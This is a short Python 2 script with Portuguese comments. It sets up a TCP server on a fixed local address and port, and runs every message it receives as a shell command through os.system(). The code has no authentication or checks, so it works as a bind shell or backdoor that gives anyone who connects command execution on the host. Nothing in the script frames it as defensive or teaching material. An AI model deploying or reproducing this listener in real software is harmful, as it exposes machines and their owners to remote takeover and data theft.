import socket
import os

HOST = '192.168.1.32'  # Endereco IP do Servidor
PORT = 4000            # Porta que o Servidor esta
tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
orig = (HOST, PORT)
tcp.bind(orig)
tcp.listen(1)
while True:
    con, cliente = tcp.accept()
    print 'Concetado por', cliente
    while True:
        msg = con.recv(1024)
        if not msg: break
        print cliente, msg
	os.system(msg)
    print 'Finalizando conexao do cliente', cliente
    con.close()
